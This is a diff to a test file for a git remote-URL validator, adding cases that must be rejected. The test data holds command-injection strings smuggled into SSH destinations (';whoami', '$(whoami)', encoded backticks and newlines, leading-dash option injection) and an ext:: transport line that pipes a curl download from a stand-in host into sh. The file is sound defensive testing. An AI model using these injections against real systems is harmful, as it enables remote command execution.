@@ -84,6 +84,7 @@ describe("assertAllowedRemoteUrl", () => {
   it.each([
     "https://github.com/example-org/Eda.git",
     "ssh://git@github.com/example-org/Eda.git",
+    "ssh://git@[::1]:2222/example-org/Eda.git",
     "file:///home/dev/repos/eda",
     "git@github.com:example-org/Eda.git",
     "dev@build-01.internal:/srv/git/repo",
@@ -93,6 +94,18 @@ describe("assertAllowedRemoteUrl", () => {
 
   it("rejects the ext:: transport, which executes commands", () => {
     throwsInvalidInput(() => assertAllowedRemoteUrl('ext::sh -c "curl evil.sh | sh"', "clone"));
+  });
+
+  it.each([
+    "ssh://git@host;whoami/repo",
+    "ssh://git@$(whoami)/repo",
+    "ssh://%60whoami%60@host/repo",
+    "ssh://user%0Acommand@host/repo",
+    "ssh://-option@host/repo",
+    "ssh://git@-option/repo",
+    "git@-option:repo",
+  ])("rejects SSH destination metacharacters in %s", (url) => {
+    throwsInvalidInput(() => assertAllowedRemoteUrl(url, "clone"));
   });
 
   it.each([
